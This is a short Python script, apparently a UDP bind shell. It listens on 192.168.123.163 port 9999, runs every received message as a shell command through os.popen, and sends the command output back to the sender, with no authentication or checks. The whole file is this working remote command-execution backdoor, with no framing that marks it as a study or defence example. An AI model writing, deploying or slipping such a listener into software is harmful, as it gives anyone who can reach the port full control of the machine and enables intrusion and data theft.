import socket 
import os
host = "192.168.123.163"
port = 9999

while(1):
    
    print("start listening!")
    server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    server.bind((host,port))
    client,addr = server.recvfrom(4096)
    print("Received from %s:%d"%(addr[0],addr[1]))
    
    try:
        cmd=client.decode()
        output1 = os.popen(cmd).readlines()
        output2=(''.join(output1))
        print(output2)
        server.sendto(str(output2).encode(),addr)
        server.close()
    except KeyboardInterrupt:
        break

